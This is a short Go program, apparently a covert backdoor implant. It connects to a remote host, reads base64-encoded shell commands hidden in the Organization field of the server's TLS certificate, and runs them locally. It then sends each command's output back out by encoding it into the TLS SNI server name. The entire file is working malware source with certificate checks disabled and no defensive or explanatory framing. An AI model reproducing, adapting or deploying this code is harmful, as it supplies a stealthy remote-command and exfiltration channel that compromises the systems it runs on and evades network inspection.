package main

import (
	"crypto/tls"
	"encoding/base64"
	"flag"
	"log"
	"net"
	"os/exec"
	"strings"
)

func executeCommand(cmd string) string {
	var (
		cmdArgs []string
		command exec.Cmd
	)
	args := strings.Split(cmd, " ")
	if len(args) > 0 {
		cmdArgs = args
	}
	command.Path = args[0]
	command.Args = cmdArgs
	out, err := command.Output()
	if err != nil {
		log.Fatal(err)
	}
	res := base64.StdEncoding.EncodeToString(out)
	return res
}

func sendResult(connectString, result string) {
	var (
		conn net.Conn
		err  error
	)
	config := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         result,
	}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		log.Fatalf("Could not connect: %s", err)
	}
	conn.Close()

}

func getCommands(connectString string) []string {
	var (
		conn     *tls.Conn
		err      error
		command  []byte
		commands []string
	)
	config := &tls.Config{
		InsecureSkipVerify: true,
	}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		log.Fatalf("Could not connect: %s", err)
	}
	defer conn.Close()
	connectionState := conn.ConnectionState()
	for _, peerCert := range connectionState.PeerCertificates {
		for _, val := range peerCert.Subject.Organization {
			command, err = base64.StdEncoding.DecodeString(val)
			if err != nil {
				continue
			}
			commands = append(commands, string(command[:]))
		}
	}
	return commands
}

func main() {
	cString := flag.String("host", "127.0.0.1:4444", "Connection string")
	flag.Parse()
	commands := getCommands(*cString)
	for _, c := range commands {
		res := executeCommand(c)
		sendResult(*cString, res)
	}
}
